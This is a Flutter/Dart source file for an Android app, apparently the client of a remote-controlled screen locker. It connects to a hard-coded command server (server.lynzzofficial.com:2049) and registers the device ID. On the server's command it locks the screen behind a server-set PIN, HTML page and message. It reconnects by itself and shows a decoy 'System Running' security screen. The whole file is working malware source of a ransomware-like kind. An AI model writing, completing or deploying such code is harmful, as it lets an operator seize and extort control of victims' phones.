import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initDeviceId();
  connectWebSocket();
  runApp(TargetApp());
}

String? deviceId;
String serverUrl = 'http://server.lynzzofficial.com:2049';
IO.Socket? socket;

Future<void> initDeviceId() async {
  if (deviceId != null) return;
  final prefs = await SharedPreferences.getInstance();
  deviceId = prefs.getString('device_id');
  if (deviceId == null) {
    final deviceInfo = await DeviceInfoPlugin().androidInfo;
    deviceId = deviceInfo.id;
    await prefs.setString('device_id', deviceId!);
  }
}

void connectWebSocket() {
  socket = IO.io(serverUrl, IO.OptionBuilder()
    .setTransports(['websocket'])
    .disableAutoConnect()
    .build());
  
  socket!.connect();
  
  socket!.on('connect', (_) {
    print('WebSocket connected');
    socket!.emit('register', deviceId);
  });
  
  socket!.on('lock', (data) async {
    print('Lock command received instantly!');
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('locked', true);
    await prefs.setString('lock_pin', data['pin'] ?? '');
    await prefs.setString('lock_html', data['html'] ?? '');
    await prefs.setString('lock_message', data['message'] ?? '');
    await showLock(data['pin'] ?? '', data['html'] ?? '', data['message'] ?? '');
  });
  
  socket!.on('unlock', (_) async {
    print('Unlock command received instantly!');
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('locked', false);
    await hideLock();
  });
  
  socket!.on('disconnect', (_) {
    print('WebSocket disconnected, reconnecting...');
    Future.delayed(Duration(seconds: 3), () => connectWebSocket());
  });
}

Future<void> showLock(String pin, String html, String message) async {
  const platform = MethodChannel('com.target.lock/commands');
  await platform.invokeMethod('showLock', {
    'pin': pin,
    'html': html,
    'message': message,
  });
}

Future<void> hideLock() async {
  const platform = MethodChannel('com.target.lock/commands');
  await platform.invokeMethod('hideLock');
}

class TargetApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(Icons.security, size: 80, color: Colors.green),
              SizedBox(height: 20),
              Text('System Running', style: TextStyle(fontSize: 18, color: Colors.white)),
              SizedBox(height: 10),
              Text('Real-time: ON', style: TextStyle(fontSize: 12, color: Colors.green)),
              SizedBox(height: 10),
              Text('Device ID: ${deviceId ?? "loading..."}', style: TextStyle(fontSize: 12, color: Colors.grey)),
            ],
          ),
        ),
        backgroundColor: Colors.black,
      ),
    );
  }
}